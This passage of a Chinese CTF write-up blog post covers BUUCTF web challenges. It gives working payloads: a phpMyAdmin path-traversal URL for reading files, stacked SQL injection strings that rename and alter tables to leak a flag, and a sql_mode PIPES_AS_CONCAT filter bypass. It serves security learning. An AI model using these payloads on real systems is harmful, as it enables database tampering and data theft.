class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cesafe.com/html/6999.html">preg_replace()&#x2F;e模式的漏洞</a></p>
+<p>如果我们直接传.*由于php字符会被解析.会被替代成下划线.所以需要换成\S,表示匹配非空以外的所有字符</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427180240530.png" alt="image-20220427180240530"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427180314218.png" alt="image-20220427180314218"></p>
+<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427181504427.png" alt="image-20220427181504427"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427182558364.png" alt="image-20220427182558364"></p>
+<p>扫到phpmyadmin</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427182738038.png" alt="image-20220427182738038"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43579362/article/details/108476182">phpmyadmin（1）</a><br> <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">phpmyadmin（2）</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220427182913156.png" alt="image-20220427182913156"></p>
+<h1 id="BUUCTF随便注"><a href="#BUUCTF随便注" class="headerlink" title="BUUCTF随便注"></a>BUUCTF随便注</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151505412.png" alt="image-20220315150501348"></p>
+<p>习惯扫目录,没扫到</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151506062.png" alt="image-20220315150640013"></p>
+<p>输入单引号,报错得出数据库mariadb </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#回显正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151507620.png" alt="image-20220315150758543"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3#报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151510055.png" alt="image-20220315151004003"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2#正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151510359.png" alt="image-20220315151033307"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2#发现有过滤</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151511268.png" alt="image-20220315151126218"></p>
+<p>大小写也绕不过</p>
+<p>那么只能堆叠注入了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151513103.png" alt="image-20220315151331036"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11&#x27;;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151514104.png" alt="image-20220315151416056"></p>
+<p>这里查看一个flag在那个字段里</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;desc `1919810931114514`;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151516959.png" alt="image-20220315151658903"></p>
+<p>查一下下一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;desc `words`;# 这里也可以不加`` </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151519393.png" alt="image-20220315151902329"></p>
+<p>那么这里面的id就有可能是我们查询时输入的值了,他的查询语句就可能是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,data from words where id=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果是这样的话,我们就可以将这里的words替换成1919810931114514将flag替换成id从而实现获取数据.那么可以将1919810931114514改名为words,在这之前需要先将words改下名,改成别的如word1.将flag改成data.但是在1919810931114514并没有id这个列名,那么我们可以给他添加一组id.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>
+
+<p>接着才查询1</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203151529964.png" alt="image-20220315152912904"></p>
+<h1 id="堆叠注入-绕过-限制"><a href="#堆叠注入-绕过-限制" class="headerlink" title="堆叠注入,绕过||限制"></a>堆叠注入,绕过||限制</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]EasySQL">BUUCTF的suctf2019,EasySQL</a></p>
+<p>闭合测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221108310.png" alt="image-20220322110813199"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221108116.png" alt="image-20220322110824045"></p>
+<p>这里输入’没有回显也没有报错</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221108356.png" alt="image-20220322110852300"></p>
+<p>这里发现有过滤,本来想fuzz的发现平台靶机不让扫手工测试吧</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221109941.png" alt="image-20220322110946880"></p>
+<p>发现过滤了union,那么联合注入肯定就不行了.</p>
+<p>尝试一下堆叠注入,发现回显了数据库</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221111781.png" alt="image-20220322111100711"></p>
+<p>接着查一下表</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221111362.png" alt="image-20220322111124297"></p>
+<p>但是查字段的时候发现了问题,这里发现from 和 flag 都被过滤了,这怎么注入</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221112015.png" alt="image-20220322111226954"></p>
+<p>这块需要我们对后端的语句进行猜测,通过输入非零数字得到回显和输入其他字符得不到回显来判断出内部的查询语句可能存在有|| ,也就是select 输入的数据|| 内置一个列名 from 表名,进一步猜测即为select post 进去的数据 || flag from flag (含有数据的表名,通过堆叠注入可知),需要注意的是,此时的|| 起到的作用是or 的作用</p>
+<p><strong>方法一</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入的内容为 *,1 </span><br><span class="line">内置的sql语句为sql = &quot;select&quot;.sql = &quot;select&quot;.post[&#x27;query&#x27;].&quot;||flag from flag&quot;;</span><br><span class="line">那么最终语句就是 &quot;select *,1 || flag from flag&quot;也就是select *,1 from flag;也就直接查出来flag表中的所有数据</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入内容为1; set sql_mode=pipes_as_concat;select 1</span><br><span class="line">其中set sql_mode=pipes_as_concat的作用是将||的作用由or变为拼接字符串</span><br></pre></td></tr></table></figure>
+
+<p>查询当前数据库的sql_mode</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221227328.png" alt="image-20220322122725261"></p>
+<p> 这个sql_mode下使用||异或运算符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0 || flag from flag;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221227813.png" alt="image-20220322122742757"></p>
+<p>当设置sql_mode为PIPES_AS_CONCAT时，将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set sql_mode=PIPES_AS_CONCAT;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221228710.png" alt="image-20220322122824640"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 || flag from flag;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221228397.png" alt="image-20220322122844336"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=&quot;select&quot;.sql=&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;</span><br><span class="line">query=3;set sql_mode=PIPES_AS_CONCAT;select 3</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203221230905.png" alt="image-20220322123021799"></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">附加几种常见的sql_mode值的介绍：</span><br><span class="line"></span><br><span class="line">几种常见的mode介绍</span><br><span class="line">ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。</span><br><span class="line"></span><br><span class="line">NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。</span><br><span class="line"></span><br><span class="line">STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制</span><br><span class="line"></span><br><span class="line">NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。</span><br><span class="line"></span><br><span class="line">NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。</span><br><span class="line"></span><br><span class="line">ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL</span><br><span class="line"></span><br><span class="line">NO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户</span><br><span class="line"></span><br><span class="line">NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</span><br><span class="line"></span><br><span class="line">PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</span><br><span class="line"></span><br><span class="line">ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</span><br></pre></td></tr></table></figure>
+
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2016/11/06/05/36/lake-1802337_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2654158699.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2014/11/15/23/31/alpsee-532864_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF(二)</div></div></a></div><div class="next-post pull-right"><a href="/288329860.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NSSCTF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/822256649.html" title="BUUCTF(一)"><img class="cover" src="https://cdn.pixabay.com/photo/2014/11/15/23/31/alpsee-532864_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">BUUCTF(一)</div></div></a></div><div><a href="/3770687296.html" title="BUUCTF(三)"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">BUUCTF(三)</div></div></a></div><div><a href="/2654158699.html" title="BUUCTF(二)"><img class="cover" src="https://cdn.pixabay.com/photo/2014/11/15/23/31/alpsee-532864_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">BUUCTF(二)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-Ezaudit"><span class="toc-number">1.</span> <span class="toc-text">[MRCTF2020]Ezaudit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-number">2.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">3.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">4.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">5.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">5.1.</span> <span class="toc-text">谈谈escapeshellarg参数绕过和注入的问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-The-mystery-of-ip"><span class="toc-number">6.</span> <span class="toc-text">[BJDCTF2020]The mystery of ip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">7.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">8.</span> <span class="toc-text">[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">9.</span> <span class="toc-text">[GWCTF 2019]我有一个数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">10.</span> <span class="toc-text">BUUCTF随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87-%E9%99%90%E5%88%B6"><span class="toc-number">11.</span> <span class="toc-text">堆叠注入,绕过||限制</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/444854351.html'
+    this.page.identifier = '/444854351.html'
+    this.page.title = 'BUUCTF(四)'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
